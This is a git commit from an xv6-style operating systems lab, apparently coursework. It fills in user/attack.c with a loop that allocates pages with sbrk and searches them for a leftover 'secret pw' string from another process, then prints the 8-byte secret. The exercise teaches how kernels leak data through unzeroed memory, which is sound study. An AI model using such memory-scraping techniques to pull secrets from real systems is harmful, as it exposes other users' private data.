e942059155aaff457880968137005413d3e8e50c
wnw231423 <2684722187@qq.com>
2025-04-20 20:54:59 +0800

    modified on attack

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,13 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
-
+  while (1) {
+    char *end = sbrk(PGSIZE);
+    *(end+31) = '\0';
+    if (strcmp(end, "my very very very secret pw is ") == 0) {
+      write(2, end+32, 8);
+      break;
+    }
+  }
   exit(1);
 }
